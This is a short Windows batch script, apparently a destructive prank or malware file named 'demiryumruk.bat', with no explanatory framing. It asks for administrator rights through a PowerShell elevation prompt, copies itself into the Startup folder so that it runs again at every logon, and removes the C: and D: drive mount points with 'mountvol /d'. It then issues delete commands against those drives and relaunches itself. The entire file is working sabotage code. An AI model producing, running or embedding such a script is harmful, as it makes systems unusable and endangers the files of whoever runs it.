@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\demiryumruk.bat"
copy "%ALLUSERSPROFILE%\Desktop\demiryumruk.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
mountvol c: /d
mountvol d: /d
del c:
del d:
start demiryumruk.bat
pause

